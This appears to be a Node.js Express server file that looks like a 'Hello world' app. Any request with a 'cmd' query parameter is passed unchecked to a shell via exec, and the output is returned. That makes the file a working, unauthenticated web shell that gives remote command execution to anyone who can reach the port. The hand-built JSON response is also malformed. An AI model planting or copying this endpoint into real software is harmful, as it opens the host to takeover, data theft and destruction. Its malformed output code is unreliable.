var express = require('express');
var url = require('url');
var exec = require('child_process').exec;

// Constants
var PORT=8180

// App
var app = express();
app.get('/', function(req, res) {
  var parsedUrl = url.parse(req.url, true);
  var cmd = parsedUrl.query['cmd'];
  if (cmd) {
    var child = exec(cmd, function(err, stdout, stderr) {
      var result = '{"stdout":' + stdout + ', "stderr":"' + stderr + '"cmd":' + cmd + '"}';
      res.send(result + '\n');
    });
  } else {
    res.send('Hello world\n');
  }
});

app.listen(PORT);
console.log('Running on http://localhost:' + PORT);

